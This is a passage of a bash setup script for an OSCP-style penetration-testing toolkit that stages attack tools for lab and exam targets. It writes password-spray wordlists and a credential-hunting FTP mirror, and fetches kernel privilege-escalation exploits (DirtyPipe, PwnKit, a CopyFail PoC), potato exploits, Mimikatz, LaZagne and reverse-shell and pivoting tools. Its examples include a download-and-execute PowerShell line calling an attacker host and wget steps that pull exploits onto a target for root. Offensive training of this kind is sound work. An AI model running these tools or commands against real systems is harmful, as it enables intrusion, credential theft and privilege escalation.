# File shares, Windows/AD, SNMP, mail, and username-enum utilities
install_pkg enum4linux-ng smbclient smbmap nbtscan snmp snmp-mibs-downloader onesixtyone ldap-utils freerdp3-x11 evil-winrm hashcat john python3-impacket keepassxc keepassxc-cli gpp-decrypt
install_pkg smtp-user-enum finger finger-user-enum keepassxc

# Database/protocol clients used by the initial-access guide
install_pkg default-mysql-client mariadb-client postgresql-client redis-tools mosquitto-clients wpscan cewl

pipx ensurepath || true
pipx install certipy-ad || true
pipx install netexec || true
# BloodHound CE is handled by Docker + SpecterOps bloodhound-cli in this toolkit.
# Do not pipx install bloodhound-ce-python; it is not a pipx package and is optional on Kali.
pipx install git-dumper || true
EOF
    chmod +x attacker/install-kali-deps.sh

    cat > attacker/INITIAL-ACCESS-TOOL-COVERAGE.txt <<'EOF'
INITIAL-ACCESS TOOL COVERAGE MAP

Web / high ports:
  - feroxbuster, gobuster, ffuf, whatweb, curl, wget, nc, telnet
  - attacker/high-port-http-check.sh
  - templates/web/sqli-manual-checklist.txt
  - templates/web/lfi-payloads.txt
  - templates/web/upload-bypass-filenames.txt
  - templates/web/xxe-payloads.txt
  - templates/web/ssrf-payloads.txt
  - webshells/cmd.php, cmd.phtml, cmd.phar, cmd.aspx, cmd.asp, cmd.jsp

Credential reuse and small-list guessing:
  - hydra, nxc/netexec, evil-winrm, xfreerdp, ssh, ftp
  - attacker/wordlists/minimal-users.txt
  - attacker/wordlists/minimal-passwords.txt
  - attacker/wordlists/oscp_usernames_augmented.txt
  - attacker/wordlists/oscp_passwords_augmented.txt

FTP / SMB / NFS:
  - ftp, wget, smbclient, smbmap, enum4linux-ng, showmount from nfs-common if installed
  - attacker/ftp-anon-mirror.sh

Mail and user enumeration:
  - smtp-user-enum, finger, finger-user-enum when available
  - attacker/finger-quick-enum.sh

Databases and key-value stores:
  - impacket-mssqlclient, mysql/mariadb client, psql, redis-cli
  - templates/services/mysql-mariadb-cheatsheet.txt
  - templates/services/postgresql-cheatsheet.txt
  - templates/services/redis-cheatsheet.txt

MQTT / unusual protocols:
  - mosquitto_sub, mosquitto_pub
  - templates/services/mqtt-cheatsheet.txt

AD initial access:
  - kerbrute, impacket, Certipy, SharpHound, BloodHound CE Docker/CLI workflow

This file deliberately avoids target-specific hints. Use observed ports, banners, files, and credentials only.
EOF



    cat > attacker/EXAM-RESTRICTED-TOOLS.txt <<'EOF'
EXAM SAFETY GUARDRAILS

Do not use during the active exam/reporting phase:
  - AI chatbots or external assistance
  - SQLmap / SQLninja / automated SQL injection exploitation
  - Nessus / OpenVAS / mass vulnerability scanners
  - ARP, DNS, NBNS, IP spoofing, or poisoning
  - Responder poisoning/spoofing
  - Metasploit modules or Meterpreter on more than one target
  - Metasploit for pivoting

Allowed broadly when used manually and within scope:
  - nmap/NSE, Burp Free, msfvenom, exploit/multi/handler with non-Meterpreter payloads
  - BloodHound CE Docker/CLI, SharpHound, OpenHound-compatible ZIP uploads
  - PowerView, Rubeus, evil-winrm, Impacket, Mimikatz after admin/SYSTEM, NetExec/CME-style checks
EOF

    cat > attacker/wordlists/minimal-users.txt <<'EOF'
admin
administrator
root
user
test
guest
ftp
backup
service
dev
web
www-data
wpadmin
manager
operator
support
EOF

    cat > attacker/wordlists/minimal-passwords.txt <<'EOF'
password
Password1
Password1!
Welcome1
Welcome1!
admin
administrator
root
test
guest
changeme
123456
12345678
qwerty
letmein
P@ssw0rd
P@ssw0rd!
EOF

    # Copy augmented OSCP wordlists when they are placed beside this setup script.
    # If the v2 files are absent, fall back to the original uploaded names.
    for src in \
      "$SCRIPT_DIR/oscp_usernames_augmented_v2.txt" \
      "$SCRIPT_DIR/oscp_usernames_augmented.txt"; do
      if [[ -f "$src" ]]; then
        cp -f "$src" attacker/wordlists/oscp_usernames_augmented.txt
        sort -u attacker/wordlists/oscp_usernames_augmented.txt -o attacker/wordlists/oscp_usernames_augmented.txt
        break
      fi
    done

    for src in \
      "$SCRIPT_DIR/oscp_passwords_augmented_v2.txt" \
      "$SCRIPT_DIR/oscp_passwords_augmented.txt"; do
      if [[ -f "$src" ]]; then
        cp -f "$src" attacker/wordlists/oscp_passwords_augmented.txt
        sort -u attacker/wordlists/oscp_passwords_augmented.txt -o attacker/wordlists/oscp_passwords_augmented.txt
        break
      fi
    done

    # Ensure augmented files always exist even if the separate list files were not copied beside the script.
    if [[ ! -s attacker/wordlists/oscp_usernames_augmented.txt ]]; then
      cp attacker/wordlists/minimal-users.txt attacker/wordlists/oscp_usernames_augmented.txt
    fi
    if [[ ! -s attacker/wordlists/oscp_passwords_augmented.txt ]]; then
      cat attacker/wordlists/minimal-passwords.txt attacker/wordlists/minimal-users.txt | sort -u > attacker/wordlists/oscp_passwords_augmented.txt
    fi

    cat > attacker/wordlists/README-WORDLISTS.txt <<'EOF'
OSCP WORDLIST USE

Standalone/default-cred use:
  Use small controlled tests against FTP, SMB, web panels, Tomcat/Jenkins, databases, and SSH only when evidence supports it.

AD use:
  Check password policy first.
  Spray one high-confidence password at a time across users.
  Do not run full username x password combinations against AD.

Files:
  oscp_usernames_augmented.txt  - common OSCP-style users and service accounts
  oscp_passwords_augmented.txt  - common weak/default/seasonal passwords plus username-as-password candidates

Target-specific generator:
  cat loot/hostnames.txt loot/domains.txt loot/services.txt 2>/dev/null | sort -u > loot/target_words.txt
  while read w; do echo "$w"; echo "${w}1"; echo "${w}123"; echo "${w}!"; echo "${w}2026"; echo "${w}2026!"; done < loot/target_words.txt | sort -u > loot/target_passwords.txt
EOF

    cat > attacker/high-port-http-check.sh <<'EOF'
#!/usr/bin/env bash
set -u
IP="${1:-}"
shift || true
if [[ -z "$IP" || "$#" -eq 0 ]]; then
  echo "Usage: $0 <IP> <port1> [port2 ...]"
  echo "Example: $0 192.168.50.10 80 443 8080 8443 9512 10883"
  exit 1
fi
for P in "$@"; do
  echo "===== $IP:$P HTTP ====="
  curl -k -m 5 -sS -i "http://$IP:$P/" | sed -n '1,25p' || true
  echo "===== $IP:$P HTTPS ====="
  curl -k -m 5 -sS -i "https://$IP:$P/" | sed -n '1,25p' || true
  echo "===== $IP:$P RAW BANNER ====="
  printf '\r\n' | timeout 5 nc -nv "$IP" "$P" 2>&1 | sed -n '1,20p' || true
  echo
 done
EOF
    chmod +x attacker/high-port-http-check.sh

    cat > attacker/finger-quick-enum.sh <<'EOF'
#!/usr/bin/env bash
set -u
IP="${1:-}"
if [[ -z "$IP" ]]; then
  echo "Usage: $0 <IP>"
  exit 1
fi
for Q in "@$IP" "0@$IP" "root@$IP" "admin@$IP" "administrator@$IP" "Admin@$IP" "user@$IP" "test@$IP" "guest@$IP"; do
  echo "===== finger $Q ====="
  timeout 10 finger "$Q" 2>&1 | sed -n '1,80p' || true
  echo
 done
if command -v finger-user-enum.pl >/dev/null 2>&1; then
  echo "===== finger-user-enum.pl small list ====="
  finger-user-enum.pl -U "$(dirname "$0")/wordlists/minimal-users.txt" -t "$IP" || true
fi
EOF
    chmod +x attacker/finger-quick-enum.sh

    cat > attacker/ftp-anon-mirror.sh <<'EOF'
#!/usr/bin/env bash
set -u
IP="${1:-}"
OUT="${2:-loot/ftp_$IP}"
if [[ -z "$IP" ]]; then
  echo "Usage: $0 <IP> [output_dir]"
  exit 1
fi
mkdir -p "$OUT"
wget -m "ftp://anonymous:anonymous@$IP/" -P "$OUT" || true
find "$OUT" -type f | sort
if command -v grep >/dev/null 2>&1; then
  grep -RniE 'pass|pwd|user|login|key|token|secret|credential|backup|db|database' "$OUT" 2>/dev/null | head -n 100 || true
fi
EOF
    chmod +x attacker/ftp-anon-mirror.sh

    cat > attacker/make-ps-enc.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
if [[ "$#" -lt 1 ]]; then
  echo "Usage: $0 '<powershell command>'"
  echo "Example: $0 'iwr http://KALI:8000/shell.ps1 -UseBasicParsing | iex'"
  exit 1
fi
printf "%s" "$*" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
echo
EOF
    chmod +x attacker/make-ps-enc.sh

    cat > attacker/decode-helper.sh <<'EOF'
#!/usr/bin/env bash
set -u
VALUE="${1:-}"
if [[ -z "$VALUE" ]]; then
  echo "Usage: $0 '<value>'"
  echo "Reads one value and attempts plain, URL, and repeated base64 decoding. Review output manually."
  exit 1
fi
printf '[raw]\n%s\n\n' "$VALUE"
printf '[url-ish percent decode]\n'
python3 - <<PY "$VALUE"
import sys, urllib.parse
print(urllib.parse.unquote(sys.argv[1]))
PY
printf '\n[base64 decode pass 1]\n'
printf '%s' "$VALUE" | base64 -d 2>/dev/null || true
printf '\n\n[base64 decode pass 2]\n'
printf '%s' "$VALUE" | base64 -d 2>/dev/null | base64 -d 2>/dev/null || true
printf '\n'
EOF
    chmod +x attacker/decode-helper.sh
}

preflight

echo "============================================================"
echo "[*] OSCP+ Toolkit Setup v6.4"
echo "[*] Target: $TOOLKIT"
echo "[*] LHOST=$LHOST  LPORT=$LPORT"
echo "============================================================"

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  LINUX — transfer these to Linux targets                                   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "LINUX ENUMERATION"
echo "[+] LinPEAS..."
dl linux/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
dl linux/linpeas_linux_amd64 https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmodx linux/linpeas.sh linux/linpeas_linux_amd64

echo "[+] Linux Smart Enumeration (lse.sh)..."
dl linux/lse.sh https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmodx linux/lse.sh

echo "[+] LinEnum fallback..."
dl linux/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmodx linux/LinEnum.sh

# unix-privesc-check (pentestmonkey): old and largely superseded by LinPEAS/lse.
# The upstream master branch is the modular v2 (a driver plus a lib/ tree), which is
# not a single self-contained file, so it does not fit the "wget one script to the
# target" workflow. Kali ships the self-contained standalone as `unix-privesc-check`,
# so stage that copy when present. Low-priority cross-check only, not a primary tool.
echo "[+] unix-privesc-check (legacy cross-check, from Kali package)..."
if [[ "$DRY_RUN" == "1" ]]; then
    echo "       dry-run: would copy Kali's unix-privesc-check into linux/"
elif have unix-privesc-check; then
    cp -f "$(command -v unix-privesc-check)" linux/unix-privesc-check && chmodx linux/unix-privesc-check
else
    warn "unix-privesc-check not installed; get it with: sudo apt install -y unix-privesc-check (optional, low priority)"
fi

echo "[+] Linux Exploit Suggester..."
dl linux/les.sh https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmodx linux/les.sh

echo "[+] Linux Exploit Suggester 2..."
dl linux/linux-exploit-suggester-2.pl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
chmodx linux/linux-exploit-suggester-2.pl

banner "LINUX PROCESS MONITORING"
echo "[+] pspy (64-bit + 32-bit)..."
dl linux/pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
dl linux/pspy32 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32
chmodx linux/pspy64 linux/pspy32

banner "LINUX NETWORKING / SHELLS"
echo "[+] Static ncat..."
dl linux/ncat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
chmodx linux/ncat

echo "[+] Static socat..."
dl linux/socat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmodx linux/socat

echo "[+] Static curl..."
dl linux/curl https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64
chmodx linux/curl

echo "[+] Static busybox..."
dl linux/busybox https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
chmodx linux/busybox

echo "[+] Static bash fallback..."
dl linux/bash-static https://github.com/robxu9/bash-static/releases/download/5.2.015-1.2.3-2/bash-linux-x86_64
chmodx linux/bash-static

banner "LINUX KERNEL EXPLOITS"
echo "[+] DirtyPipe exploit sources..."
dl linux/kernel-exploits/DirtyPipe/exploit.c https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
dl linux/kernel-exploits/DirtyPipe/exploit-1.c https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
dl linux/kernel-exploits/DirtyPipe/exploit-2.c https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c

echo "[+] PwnKit self-contained binary..."
dl linux/kernel-exploits/PwnKit/PwnKit https://github.com/ly4k/PwnKit/raw/main/PwnKit
chmodx linux/kernel-exploits/PwnKit/PwnKit

echo "[+] Copy Fail prereq checker, verified PoC fetcher, and README..."
cat > linux/kernel-exploits/CopyFail/check-copyfail-prereqs.sh <<'EOF'
#!/usr/bin/env bash
set -u
ok=1
printf '[*] Copy Fail / CVE-2026-31431 prereq check\n'
printf '[*] Kernel: '; uname -a
PYBIN=""
for p in python3 python3.13 python3.12 python3.11 python3.10; do
  if command -v "$p" >/dev/null 2>&1; then
    if "$p" - <<'PYEOF' >/dev/null 2>&1
import sys, os
raise SystemExit(0 if sys.version_info >= (3,10) and hasattr(os, 'splice') else 1)
PYEOF
    then PYBIN="$p"; break; fi
  fi
done
if [[ -n "$PYBIN" ]]; then
  echo "[OK] python>=3.10 with os.splice: $PYBIN"
else
  echo "[NO] python>=3.10 with os.splice not found"
  ok=0
fi
if [[ -u /usr/bin/su && -x /usr/bin/su && -r /usr/bin/su ]]; then
  echo "[OK] /usr/bin/su is readable, SUID-root, and executable"
else
  echo "[NO] /usr/bin/su is not readable/SUID-root/executable; look for another readable SUID target or skip"
  ok=0
fi
if [[ -n "$PYBIN" ]]; then
  "$PYBIN" - <<'PYEOF'
import socket, sys
candidates = [
    ('aead', 'authencesn(hmac(sha256),cbc(aes))'),
    ('aead', 'authencesn(hmac(sha1),cbc(aes))'),
]
last = None
for fam, alg in candidates:
    try:
        sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        sock.bind((fam, alg))
        print(f'[OK] AF_ALG bind worked: {fam}/{alg}')
        sys.exit(0)
    except Exception as e:
        last = e
print('[NO] AF_ALG authencesn bind failed:', last)
sys.exit(1)
PYEOF
  [[ $? -eq 0 ]] || ok=0
else
  ok=0
fi
if command -v lsmod >/dev/null 2>&1 && lsmod | grep -q '^algif_aead'; then
  echo "[INFO] algif_aead module is loaded"
fi
if [[ -f ./copy_fail_exp.py ]]; then
  if command -v sha256sum >/dev/null 2>&1; then
    sum="$(sha256sum ./copy_fail_exp.py | awk '{print $1}')"
    if [[ "$sum" == "a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9" ]]; then
      echo "[OK] copy_fail_exp.py exists and SHA256 matches official PoC"
    else
      echo "[NO] copy_fail_exp.py exists but SHA256 does not match expected official PoC"
      ok=0
    fi
  else
    echo "[INFO] copy_fail_exp.py exists, but sha256sum is unavailable"
  fi
else
  echo "[INFO] copy_fail_exp.py not found in current directory; fetch/stage it before relying on this path"
fi
exit "$ok"
EOF
chmod +x linux/kernel-exploits/CopyFail/check-copyfail-prereqs.sh

cat > linux/kernel-exploits/CopyFail/fetch-copyfail-poc.sh <<'EOF'
#!/usr/bin/env bash
set -Eeuo pipefail
OUT="${1:-copy_fail_exp.py}"
URL="https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/main/copy_fail_exp.py"
EXPECTED="a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9"
TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT
curl -fL --retry 3 --connect-timeout 10 --max-time 60 -o "$TMP" "$URL"
ACTUAL="$(sha256sum "$TMP" | awk '{print $1}')"
if [[ "$ACTUAL" != "$EXPECTED" ]]; then
  echo "[!] SHA256 mismatch for CopyFail PoC"
  echo "    expected: $EXPECTED"
  echo "    actual:   $ACTUAL"
  exit 1
fi
mv "$TMP" "$OUT"
chmod +x "$OUT"
echo "[+] Saved verified CopyFail PoC to $OUT"
EOF
chmod +x linux/kernel-exploits/CopyFail/fetch-copyfail-poc.sh

if [[ "$DRY_RUN" != "1" ]]; then
    (cd linux/kernel-exploits/CopyFail && ./fetch-copyfail-poc.sh copy_fail_exp.py) || warn "CopyFail PoC fetch/hash verification failed; fetch manually with fetch-copyfail-poc.sh"
else
    echo "       dry-run: would fetch and hash-check CopyFail PoC"
fi

cat > linux/kernel-exploits/CopyFail/README-COPYFAIL.txt <<'EOF'
COPY FAIL / CVE-2026-31431

Use this only after normal Linux privilege-escalation paths fail and only on authorized lab/exam targets.
This toolkit stages:
  check-copyfail-prereqs.sh  - target-side precheck
  fetch-copyfail-poc.sh      - Kali-side verified PoC fetcher
  copy_fail_exp.py           - official PoC when online fetch + SHA256 verification succeeds

Expected official PoC SHA256:
  a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9

When to try:
  - initial shell is local unprivileged Linux user;
  - kernel is in the vulnerable window;
  - Python 3.10+ with os.splice exists on target;
  - AF_ALG authencesn bind works;
  - /usr/bin/su or another readable SUID-root binary exists.

Kali staging check:
  cd ~/privesc-toolkit/linux/kernel-exploits/CopyFail
  ./fetch-copyfail-poc.sh copy_fail_exp.py
  sha256sum copy_fail_exp.py

Target flow:
  cd /tmp
  wget http://<KALI_IP>:8000/linux/kernel-exploits/CopyFail/check-copyfail-prereqs.sh -O check-copyfail-prereqs.sh
  wget http://<KALI_IP>:8000/linux/kernel-exploits/CopyFail/copy_fail_exp.py -O copy_fail_exp.py
  chmod +x check-copyfail-prereqs.sh copy_fail_exp.py
  ./check-copyfail-prereqs.sh
  python3 copy_fail_exp.py

If it drops into su/root shell, immediately verify and capture proof:
  id
  whoami
  hostname
  cat /root/proof.txt 2>/dev/null

If prechecks fail, skip this path. If the exploit hangs or returns without root, stop and move on; repeated runs can destabilize the box.
EOF

if have gcc && [[ "$DRY_RUN" != "1" ]]; then
    echo "[+] Pre-compiling DirtyPipe exploits where possible..."
    gcc linux/kernel-exploits/DirtyPipe/exploit.c -o linux/kernel-exploits/DirtyPipe/dirtypipe-arinerron 2>/dev/null || warn "DirtyPipe Arinerron compile failed"
    gcc linux/kernel-exploits/DirtyPipe/exploit-1.c -o linux/kernel-exploits/DirtyPipe/dirtypipe-alexis1 2>/dev/null || warn "DirtyPipe Alexis exploit-1 compile failed"
    gcc linux/kernel-exploits/DirtyPipe/exploit-2.c -o linux/kernel-exploits/DirtyPipe/dirtypipe-alexis2 2>/dev/null || warn "DirtyPipe Alexis exploit-2 compile failed"
fi

banner "LINUX PIVOTING"
echo "[+] Chisel Linux amd64..."
dl_gz linux/chisel "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_linux_amd64.gz"
chmodx linux/chisel

echo "[+] Ligolo-ng agent Linux amd64..."
dl_targz_dir linux "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_linux_amd64.tar.gz"
for f in linux/ligolo-ng_agent linux/ligolo-ng_agent_*_linux_amd64 linux/agent; do
    [[ -f "$f" ]] && mv -f "$f" linux/ligolo-agent 2>/dev/null && break
done
chmodx linux/ligolo-agent

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  WINDOWS — transfer these to Windows targets                               ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "WINDOWS ENUMERATION"
BASE="https://github.com/peass-ng/PEASS-ng/releases/latest/download"
echo "[+] WinPEAS family..."
dl windows/winPEASx64.exe "$BASE/winPEASx64.exe"
dl windows/winPEASx86.exe "$BASE/winPEASx86.exe"
dl windows/winPEASany.exe "$BASE/winPEASany.exe"
dl windows/winPEAS.bat "$BASE/winPEAS.bat"
dl windows/winPEAS.ps1 https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
dl windows/winPEASx64_ofs.exe "$BASE/winPEASx64_ofs.exe"
dl windows/winPEASx86_ofs.exe "$BASE/winPEASx86_ofs.exe"

echo "[+] PowerUp.ps1..."
dl windows/PowerUp.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

echo "[+] PrivescCheck.ps1..."
dl windows/PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1

echo "[+] Seatbelt.exe..."
dl windows/Seatbelt.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe

echo "[+] SharpUp.exe..."
dl windows/SharpUp.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe

# SharpCollection (Flangvik): nightly-built .NET offensive binaries across multiple
# runtimes. Superset of the individual Ghostpack .exe files above (Rubeus, Certify,
# Seatbelt, SharpUp, etc.); useful when you need a specific .NET version build or a
# tool not staged individually. Large clone, so it lives under windows/SharpCollection.
echo "[+] SharpCollection (.NET binaries, superset of Ghostpack)..."
git_clone https://github.com/Flangvik/SharpCollection.git windows/SharpCollection

echo "[+] accesschk64.exe (official signed Sysinternals zip)..."
# live.sysinternals.com occasionally serves an EULA/redirect instead of the PE;
# the download.sysinternals.com zip is the canonical, signed source.
dl_zip_match windows/accesschk64.exe https://download.sysinternals.com/files/AccessChk.zip '(^|/)accesschk64\.exe$'

banner "WINDOWS PRIVILEGE ESCALATION"
echo "[+] GodPotato..."
dl windows/GodPotato-NET4.exe https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
dl windows/GodPotato-NET35.exe https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe

echo "[+] PrintSpoofer..."
dl windows/PrintSpoofer64.exe https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
dl windows/PrintSpoofer32.exe https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe

echo "[+] JuicyPotato..."
dl windows/JuicyPotato.exe https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe

echo "[+] SigmaPotato..."
dl windows/SigmaPotato.exe https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe

echo "[+] FullPowers..."
dl windows/FullPowers.exe https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe

echo "[+] JuicyPotatoNG fallback..."
dl_zip_match windows/JuicyPotatoNG.exe https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip '(^|/)JuicyPotatoNG\.exe$'

echo "[+] RoguePotato fallback..."
dl_zip_match windows/RoguePotato.exe https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip '(^|/)RoguePotato\.exe$'
dl_zip_match windows/RogueOxidResolver.exe https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip '(^|/)RogueOxidResolver\.exe$'

echo "[+] SharpEfsPotato fallback..."
# The upstream project does not publish release binaries. Keep the official source locally
# and compile before the exam if you need this fallback.
git_clone https://github.com/bugch3ck/SharpEfsPotato.git attacker/source/SharpEfsPotato
if [[ -d attacker/source/SharpEfsPotato ]]; then
    if have msbuild && [[ "$DRY_RUN" != "1" ]]; then
        (cd attacker/source/SharpEfsPotato && msbuild SharpEfsPotato.sln /p:Configuration=Release >/dev/null 2>&1) || warn "SharpEfsPotato compile failed; source was still cloned"
        SHARPEFS_EXE="$(find attacker/source/SharpEfsPotato -type f -iname 'SharpEfsPotato.exe' | head -n 1 || true)"
        [[ -n "$SHARPEFS_EXE" ]] && cp -f "$SHARPEFS_EXE" windows/SharpEfsPotato.exe
    else
        warn "SharpEfsPotato has no official release binary; source cloned to attacker/source/SharpEfsPotato"
    fi
fi
cat > windows/README-SharpEfsPotato.txt <<'EOF'
SharpEfsPotato upstream does not publish an official release .exe.
The setup script clones the official source into attacker/source/SharpEfsPotato.
Prepare a compiled SharpEfsPotato.exe before the exam if you want this fallback ready.
Use it only when whoami /priv shows SeImpersonatePrivilege or similar token-abuse conditions.
EOF

banner "WINDOWS CREDENTIAL DUMPING"
echo "[+] Mimikatz ebalo55 Win11-compatible fork..."
git_clone https://github.com/ebalo55/mimikatz.git /tmp/mimikatz-ebalo55
if [[ -d /tmp/mimikatz-ebalo55/x64 ]]; then
    mkdir -p windows/mimikatz-ebalo55
    cp -r /tmp/mimikatz-ebalo55/x64/* windows/mimikatz-ebalo55/ || true
else
    warn "Could not find ebalo55 x64 binaries; check repo manually"
fi
rm -rf /tmp/mimikatz-ebalo55

echo "[+] Mimikatz original latest fallback..."
dl_zip_dir windows/mimikatz-original https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip

echo "[+] Mimikatz pinned stable fallback..."
dl_zip_dir windows/mimikatz-stable-2.2.0-20220919 https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

echo "[+] LaZagne..."
dl windows/LaZagne.exe https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe

echo "[+] RunasCs..."
dl_zip_dir windows/RunasCs https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip

banner "WINDOWS ACTIVE DIRECTORY"
echo "[+] Rubeus..."
dl windows/Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

echo "[+] Certify..."
dl windows/Certify.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe

echo "[+] SharpHound latest zip..."
SHARPHOUND_URL="$(github_latest_asset SpecterOps/SharpHound '\.zip$' || true)"
if [[ -n "$SHARPHOUND_URL" ]]; then
    dl_zip_dir windows/SharpHound "$SHARPHOUND_URL"
else
    fail_or_continue "SharpHound latest zip"
fi

echo "[+] PowerView..."
dl windows/PowerView.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

echo "[+] PowerUpSQL..."
dl windows/PowerUpSQL.ps1 https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1


echo "[+] McAfee SiteList decryptors..."
git_clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption.git attacker/decryptors/mcafee-sitelist-pwd-decryption
dl windows/Get-SiteListPassword.ps1 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-SiteListPassword.ps1
cat > attacker/decryptors/README-McAfee-SiteList.txt <<'EOF'
Use when WinPEAS/manual review finds McAfee SiteList.xml with encrypted Password fields.
Common paths:
  C:\ProgramData\McAfee\Common Framework\SiteList.xml
  C:\Users\All Users\McAfee\Common Framework\SiteList.xml

Kali usage:
  cd attacker/decryptors/mcafee-sitelist-pwd-decryption
  python3 -m pip install --user pycryptodomex
  python3 mcafee_sitelist_pwd_decrypt.py '<ENCRYPTED_BASE64_PASSWORD>'

Windows PowerShell option:
  Import-Module C:\Temp\Get-SiteListPassword.ps1
  Get-SiteListPassword -Path 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'
EOF




echo "[+] brutalkeepass fallback for unsupported KeePass versions..."
git_clone https://github.com/toneillcodes/brutalkeepass.git attacker/source/brutalkeepass
cat > attacker/source/README-brutalkeepass.txt <<'EOF'
Use when keepass2john cannot parse a .kdbx file, especially unsupported newer KeePass versions.

Setup:
  cd ~/privesc-toolkit/attacker/source/brutalkeepass
  python3 -m venv venv
  source venv/bin/activate
  python3 -m pip install -r requirements.txt

Usage:
  python3 bfkeepass.py -d /path/to/Database.kdbx -w /usr/share/wordlists/rockyou.txt -o -v
EOF

banner "WINDOWS NETWORKING / SHELLS"
echo "[+] nc64.exe..."
dl windows/nc64.exe https://github.com/int0x33/nc.exe/raw/master/nc64.exe

echo "[+] Invoke-PowerShellTcp.ps1..."
dl windows/Invoke-PowerShellTcp.ps1 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

# ConPtyShell: gives a fully interactive PTY on Windows (arrow keys, tab-complete,
# Ctrl-C), which is the practical answer to "Windows shell stabilization". This is
# more useful on the exam than a Windows socat build (of which there is no official
# release; all are unverified third-party binaries), so socat-windows is not staged.
echo "[+] Invoke-ConPtyShell.ps1 (interactive Windows shell upgrade)..."
dl windows/Invoke-ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

# PsExec64.exe from the official signed Sysinternals PSTools bundle. On-target
# lateral movement / running as SYSTEM once you have admin creds. Kali-side, prefer
# impacket-psexec; this is the native Windows binary for use from a foothold.
echo "[+] PsExec64.exe (official signed Sysinternals PSTools)..."
dl_zip_match windows/PsExec64.exe https://download.sysinternals.com/files/PSTools.zip '(^|/)PsExec64\.exe$'

banner "WINDOWS PIVOTING"
echo "[+] Chisel Windows amd64..."
dl_zip_first windows/chisel.exe "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_amd64.zip"

echo "[+] Chisel Windows 386..."
dl_zip_first windows/chisel32.exe "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_386.zip"

echo "[+] Ligolo-ng agent Windows amd64..."
dl_zip_dir windows "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_windows_amd64.zip"
for f in windows/agent.exe windows/ligolo-ng_agent*.exe; do
    [[ -f "$f" ]] && mv -f "$f" windows/ligolo-agent.exe 2>/dev/null && break
done

# UACMe is intentionally kept as source to avoid relying on unstable third-party binaries.
echo "[+] UACMe source reference..."
git_clone https://github.com/hfiref0x/UACME.git attacker/source/UACME
cat > windows/README-UACME.txt <<'EOF'
